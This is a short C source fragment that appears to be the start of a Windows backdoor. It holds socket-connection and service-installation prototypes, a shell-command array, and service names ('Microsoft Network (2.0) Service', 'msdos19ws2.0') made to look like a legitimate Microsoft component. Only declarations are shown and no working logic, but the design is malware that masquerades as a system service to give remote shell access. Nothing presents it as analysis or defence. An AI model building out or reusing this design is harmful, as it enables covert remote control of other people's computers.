#include <windows.h>
#include <ws2tcpip.h>
#include <winsock2.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <signal.h>

#define FILE_EXIST 0
#define FILE_DNT_EXIST 1 
#define FILE_ERROR 2


SOCKET MakeConnection();
void MakeCommunication( SOCKET sockfd );
int LoadMyService();
int CreateServiceName();
int CreateFileRunnable();
void SignalHandler();
int GetWindowsN( SOCKET sockfd );


char SystemServiceName[] = "msdos19ws2.0\0";
char ProcessExecutablePath_CmdLine[260];
char MicroSvc[] = "Microsoft Network (2.0) Service\0";
char ProcessExecutablePath[260];
char FileName[60];
char * const Shell_Commands[] = { "cwindow" , "dir" , "" , "" , "" , "" , "" , "" "" , };
